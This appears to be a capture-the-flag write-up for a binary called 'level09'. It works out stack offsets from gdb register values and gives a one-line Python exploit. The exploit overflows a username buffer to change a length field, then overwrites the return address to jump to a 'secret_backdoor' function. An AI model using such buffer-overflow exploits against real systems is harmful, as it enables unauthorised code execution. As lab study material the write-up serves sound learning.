stack:
```
rbp            0x7fffffffe000      0x7fffffffe000
rsp            0x7fffffffdf40      0x7fffffffdf40

Hex value:
e000 – df40 = C0

Decimal value:
57344 – 57152 = 192

rbp-192 = char msg[140]
rbp-52 = char user[40]
rbp-12 = int len
```
192 + 8 (to reach rbp+8 cause 64 bit) = 200 bytes for ret address

need to write address of secret_backdoor aka `000055555555488c` so 200 + 8 bytes to write = 208 bytes aka '\xd0'

exploit:
```
(python -c "print('a' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
```
> Need the '\n' for the first fgets to not put the following things we write to be lost in the buffer of the `set_username` function